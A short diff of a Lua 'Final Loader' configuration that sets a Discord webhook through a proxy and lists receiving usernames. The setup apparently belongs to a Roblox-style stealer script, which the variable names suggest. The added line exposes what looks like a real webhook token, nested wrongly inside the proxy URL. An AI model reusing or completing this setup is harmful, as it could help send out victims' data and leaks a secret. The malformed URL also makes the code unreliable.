@@ -1,6 +1,6 @@
 -- Final Loader (with working Discord proxy)
 
-_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/PASTE_ONLY_THE_REST_HERE"
+_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA"
 -- Example: https://webhook.lewisakura.moe/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE
 
 _G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "yourusernamehere"}
